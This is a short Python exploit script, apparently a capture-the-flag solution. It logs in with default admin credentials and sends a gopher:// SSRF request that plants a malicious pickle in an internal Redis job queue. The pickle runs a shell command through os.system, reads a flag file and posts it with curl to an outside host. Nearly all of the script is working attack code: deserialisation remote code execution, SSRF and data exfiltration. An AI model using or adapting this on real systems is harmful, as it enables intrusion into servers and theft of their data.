import requests
import pickle
import base64

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return (os.system,(cmd,))
        
    payload = pickle.dumps(PickleRce())
    return payload

base = "http://ip:port/"

r = requests.get(base + "/api/login", json={"username": "admin", "password": "admin"})
print(f"r.cookies")

picklePayload = base64.b64encode(generate_payload("/readflag > /tmp/flag; curl -d @/tmp/flag http://ip:port/?flag="))

print(f"{picklePayload=}")

ssrf = "gopher://127.0.0.1:6379/_" + requests.utils.quote(f"HSET jobs 100 {picklePayload.decode()}\n")
r = requests.get(base + "/api/tracks/add", json={"url": ssrf}, cookies=r.cookies)
print(r.text)